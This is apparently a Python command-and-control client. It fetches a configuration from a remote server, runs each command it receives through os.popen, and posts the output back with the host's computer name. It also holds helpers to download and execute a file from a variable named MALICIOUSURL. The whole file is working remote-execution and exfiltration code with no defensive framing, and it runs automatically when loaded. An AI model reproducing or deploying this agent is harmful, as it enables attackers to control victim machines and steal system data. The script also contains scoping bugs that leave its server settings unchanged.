import requests
import json
import sys, string, os
import ast
#https://stackoverflow.com/questions/25707558/json-valueerror-expecting-property-name-line-1-column-2-char-1

SERVERADDRESS = 'http://localhost'
CONFIGURATIONPATH = '/Configuration'
HEADERS = {'UUID':'5a968c26-b565-4b65-8445-9e87780cb8f9-01'}
COMMANDSTOEXE = None
MALICIOUSURL = None


def HttpGetRequest(path, parameters):
    #FOR TLS
    #r = requests.Session()
    r = requests.get(SERVERADDRESS+path ,params=parameters, headers=HEADERS)
    #print('This is he url: '+r.url)
    #print('This is the response: ')
    print(r.text)
    return r.text

def HttpPostRequest(path, parameters):
    #FOR TLS
    #r = requests.Session()
    r = requests.post(SERVERADDRESS+path, data=parameters, headers=HEADERS)
    #print('This is the response: ')
    #print(r.text)
    return r.text

def conf():
    #conf = json.loads((HttpGetRequest(CONFIGURATIONPATH,None)))
    conf = ast.literal_eval(HttpGetRequest(CONFIGURATIONPATH,None))
    print(json.dumps(conf))
    SERVERADDRESS = conf['Server']
    COMMANDSTOEXE = conf['Commands']
    MALICIOUSURL = conf['MaliciousURL']
    print("This is the conf:")
    for command in COMMANDSTOEXE:

        HttpPostRequest('/Commands',PreperToSend(str(command),RunCommand(str(command))))


def RunCommand(command):
    run = os.popen(command).read()
    #print(run)
    return run

def PreperToSend(type,str):
    print('HERE')
    j = json.dumps({'computer':os.environ['COMPUTERNAME'],'type':type,'data':str})
    return j

def DownloadFile(url):
    file = url.split('/')[-1]
    print(file)
    r = requests.Session()
    # NOTE the stream=True parameter
    r = r.get(url, stream=True)
    with open(file, 'wb') as f:
        for chunk in r.iter_content(chunk_size=1024):
            if chunk: # filter out keep-alive new chunks
                f.write(chunk)
                #f.flush() commented by recommendation from J.F.Sebastian
    return file

def RemoveFile(local_filename):
    os.remove(local_filename)

def RunExeFile(file):
    os.system(file)

conf()

#print(loadJson(PreperToSend('systeminfo',RunCommand('systeminfo'))))

#file = DownloadFile('https://www.w3schools.com/html/pic_trulli.jpg')

#HttpPostRequest(SERVERADDRESS,'/systeminfo',(PreperToSend('systeminfo',RunCommand('systeminfo'))))

#HttpPostRequest(SERVERADDRESS,'\ClientInfo',)
